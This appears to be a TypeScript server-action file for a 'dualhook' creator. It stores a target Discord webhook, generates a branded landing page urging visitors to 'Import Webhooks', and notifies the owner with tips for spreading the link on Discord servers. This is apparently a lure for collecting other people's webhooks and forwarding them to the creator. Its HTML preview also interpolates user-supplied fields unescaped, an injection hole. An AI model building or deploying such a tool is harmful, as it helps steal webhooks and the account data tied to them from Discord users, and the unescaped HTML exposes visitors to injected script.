"use server"

// Store dualhook configurations
// In a real app, this would be stored in a database
const dualhooks = new Map<
  string,
  {
    targetWebhook: string
    name: string
    description: string
    theme: string
    accentColor: string
    backgroundStyle: string
    logoUrl: string
    customCss: string
    redirectUrl: string
    successMessage: string
    buttonText: string
    showBranding: boolean
    requireVerification: boolean
    minimumWebhooks: number
    createdAt: Date
  }
>()

// Generate a unique code for the dualhook
function generateUniqueCode(): string {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
  let code = ""
  for (let i = 0; i < 8; i++) {
    code += characters.charAt(Math.floor(Math.random() * characters.length))
  }
  return code
}

export async function createDualhook(config: any): Promise<{ success: boolean; code?: string; message?: string }> {
  try {
    // Validate the webhook URL
    if (!config.targetWebhook || !config.targetWebhook.startsWith("https://discord.com/api/webhooks/")) {
      return { success: false, message: "Invalid webhook URL" }
    }

    // Test the webhook to make sure it's valid
    const testResult = await testDualhook(config.targetWebhook)
    if (!testResult.success) {
      return { success: false, message: `Invalid webhook: ${testResult.message}` }
    }

    // Generate a unique code for the dualhook
    const code = generateUniqueCode()

    // Store the dualhook configuration
    dualhooks.set(code, {
      targetWebhook: config.targetWebhook,
      name: config.name || "Shockify Dualhook",
      description: config.description || "Import webhooks and get access to exclusive content!",
      theme: config.theme || "purple",
      accentColor: config.accentColor || "#8B5CF6",
      backgroundStyle: config.backgroundStyle || "particles",
      logoUrl: config.logoUrl || "",
      customCss: config.customCss || "",
      redirectUrl: config.redirectUrl || "",
      successMessage: config.successMessage || "Webhooks imported successfully! Thank you for your contribution.",
      buttonText: config.buttonText || "Import Webhooks",
      showBranding: config.showBranding !== undefined ? config.showBranding : true,
      requireVerification: config.requireVerification || false,
      minimumWebhooks: config.minimumWebhooks || 1,
      createdAt: new Date(),
    })

    // Send a notification to the webhook owner
    await sendDualhookCreationNotification(config.targetWebhook, code)

    return { success: true, code }
  } catch (error) {
    console.error("Error creating dualhook:", error)
    return { success: false, message: "An error occurred while creating the dualhook" }
  }
}

export async function testDualhook(webhookUrl: string): Promise<{ success: boolean; message?: string }> {
  try {
    // Test the webhook by sending a test message
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: "🔍 Testing webhook connection from Shockify Dualhook Creator",
        username: "Shockify Test",
        avatar_url:
          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
      }),
    })

    if (response.status === 429) {
      return { success: false, message: "Rate limited by Discord. Please try again later." }
    }

    if (!response.ok) {
      return { success: false, message: `Error ${response.status}: ${await response.text()}` }
    }

    return { success: true }
  } catch (error) {
    console.error("Error testing dualhook:", error)
    return { success: false, message: "Failed to connect to the webhook" }
  }
}

export async function generatePreview(config: any): Promise<{ success: boolean; html?: string; message?: string }> {
  try {
    // Generate HTML preview based on the configuration
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>${config.name || "Shockify Dualhook"}</title>
        <style>
          :root {
            --accent-color: ${config.accentColor || "#8B5CF6"};
            --bg-color: #000000;
            --text-color: #ffffff;
          }
          
          body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            position: relative;
            overflow: hidden;
          }
          
          ${getBackgroundStyle(config.backgroundStyle || "particles")}
          
          .dualhook-container {
            max-width: 500px;
            width: 90%;
            background-color: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 12px;
            border: 1px solid rgba(139, 92, 246, 0.3);
            padding: 2rem;
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
            position: relative;
            z-index: 10;
          }
          
          .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 1.5rem;
          }
          
          .logo img {
            max-width: 100px;
            max-height: 100px;
            border-radius: 50%;
          }
          
          h1 {
            font-size: 1.8rem;
            text-align: center;
            margin-bottom: 1rem;
            background: linear-gradient(to right, var(--accent-color), #a78bfa);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
          }
          
          p {
            text-align: center;
            margin-bottom: 1.5rem;
            color: rgba(255, 255, 255, 0.8);
            line-height: 1.5;
          }
          
          .dualhook-button {
            display: block;
            width: 100%;
            padding: 0.75rem;
            background: linear-gradient(to right, var(--accent-color), #7c3aed);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            margin-top: 1rem;
          }
          
          .dualhook-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.4);
          }
          
          .branding {
            margin-top: 1.5rem;
            text-align: center;
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.5);
          }
          
          .branding a {
            color: var(--accent-color);
            text-decoration: none;
          }
          
          ${config.customCss || ""}
        </style>
      </head>
      <body>
        <div class="dualhook-container">
          ${config.logoUrl ? `<div class="logo"><img src="${config.logoUrl}" alt="Logo"></div>` : ""}
          <h1>${config.name || "Shockify Dualhook"}</h1>
          <p>${config.description || "Import webhooks and get access to exclusive content!"}</p>
          <button class="dualhook-button">${config.buttonText || "Import Webhooks"}</button>
          ${
            config.showBranding
              ? `
          <div class="branding">
            Powered by <a href="https://shockify.lol" target="_blank">Shockify</a>
          </div>
          `
              : ""
          }
        </div>
      </body>
      </html>
    `

    return { success: true, html }
  } catch (error) {
    console.error("Error generating preview:", error)
    return { success: false, message: "Failed to generate preview" }
  }
}

// Helper function to get the background style based on the selected option
function getBackgroundStyle(style: string): string {
  switch (style) {
    case "particles":
      return `
        body::before {
          content: "";
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, rgba(139, 92, 246, 0.1), transparent 70%);
          z-index: 0;
        }
      `
    case "gradient":
      return `
        body {
          background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
          background-size: 400% 400%;
          animation: gradient 15s ease infinite;
        }
        
        @keyframes gradient {
          0% {
            background-position: 0% 50%;
          }
          50% {
            background-position: 100% 50%;
          }
          100% {
            background-position: 0% 50%;
          }
        }
      `
    case "solid":
      return `
        body {
          background-color: #121212;
        }
      `
    case "stars":
      return `
        body {
          background-color: #0a0a0a;
          background-image: radial-gradient(white, rgba(255,255,255,.2) 2px, transparent 40px),
                            radial-gradient(white, rgba(255,255,255,.15) 1px, transparent 30px),
                            radial-gradient(white, rgba(255,255,255,.1) 2px, transparent 40px);
          background-size: 550px 550px, 350px 350px, 250px 250px;
          background-position: 0 0, 40px 60px, 130px 270px;
        }
      `
    case "matrix":
      return `
        body {
          background-color: #000;
          position: relative;
          overflow: hidden;
        }
        
        body::before {
          content: "";
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: linear-gradient(rgba(0, 255, 0, 0.05), rgba(0, 255, 0, 0.05));
          z-index: 0;
        }
      `
    default:
      return `
        body::before {
          content: "";
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, rgba(139, 92, 246, 0.1), transparent 70%);
          z-index: 0;
        }
      `
  }
}

// Get dualhook configuration by code
export async function getDualhook(code: string): Promise<any | null> {
  return dualhooks.get(code) || null
}

// Send a notification to the webhook owner when a dualhook is created
async function sendDualhookCreationNotification(webhookUrl: string, code: string): Promise<void> {
  try {
    const dualhookUrl = `https://shockify.lol/dualhook/${code}`

    await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [
          {
            title: "🎉 Your Dualhook Has Been Created!",
            description:
              "Your dualhook has been successfully created. Share the link below to start collecting webhooks!",
            color: 0x8b5cf6,
            fields: [
              {
                name: "Dualhook URL",
                value: `[${dualhookUrl}](${dualhookUrl})`,
                inline: false,
              },
              {
                name: "How It Works",
                value:
                  "When users visit your dualhook link and import webhooks, they will be automatically forwarded to your webhook.",
                inline: false,
              },
              {
                name: "Tips",
                value:
                  "- Share your dualhook link on Discord servers\n- Use it in combination with exclusive content\n- Create multiple dualhooks for different sources",
                inline: false,
              },
            ],
            footer: {
              text: "Shockify Dualhook Creator",
              icon_url:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
            },
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    })
  } catch (error) {
    console.error("Error sending dualhook creation notification:", error)
  }
}
